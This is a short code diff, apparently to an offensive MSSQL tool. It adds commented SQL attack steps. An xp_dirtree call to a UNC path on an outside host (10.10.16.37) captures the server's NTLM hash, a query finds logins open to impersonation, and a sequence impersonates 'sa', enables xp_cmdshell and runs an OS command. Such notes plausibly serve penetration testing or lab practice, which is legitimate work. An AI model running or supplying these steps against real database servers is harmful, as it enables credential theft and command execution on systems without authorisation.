@@ -28,7 +28,25 @@
             // EXEC xp_dirtree 'C:\', 1, 1
             // If `public` has `xp_dirtree`, then you can capture the hash
             // If `public` has `dm_os_file_exists`, then you can check what files exist
+            // exec master.dbo.xp_dirtree '\\10.10.16.37\test'
+
+            // Test users you can impersonate
+            /*
+            SELECT distinct b.name
+            FROM sys.server_permissions a
+            INNER JOIN sys.server_principals b
+            ON a.grantor_principal_id = b.principal_id
+            WHERE a.permission_name = 'IMPERSONATE'
+
+            // If you can impersonate "sa"
+            EXECUTE AS LOGIN = 'sa';
+            EXEC master..sp_configure 'show advanced options', '1'
+            RECONFIGURE
+            EXEC master..sp_configure 'xp_cmdshell', '1'
+            RECONFIGURE
+            EXEC master..xp_cmdshell 'whoami' // Rerun at end
+            */
             return "";
-}
-}
+        }
+    }
 }
